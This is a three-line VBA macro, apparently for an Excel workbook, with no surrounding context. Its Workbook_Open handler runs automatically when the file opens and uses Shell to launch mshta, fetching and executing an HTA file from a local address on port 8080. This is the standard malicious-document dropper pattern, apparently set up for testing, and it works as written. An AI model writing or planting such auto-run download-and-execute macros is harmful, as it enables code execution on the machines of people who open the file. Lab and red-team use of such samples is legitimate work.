Private Sub Workbook_Open()
    Call Shell("mshta http://127.0.0.1:8080/test.hta")
End Sub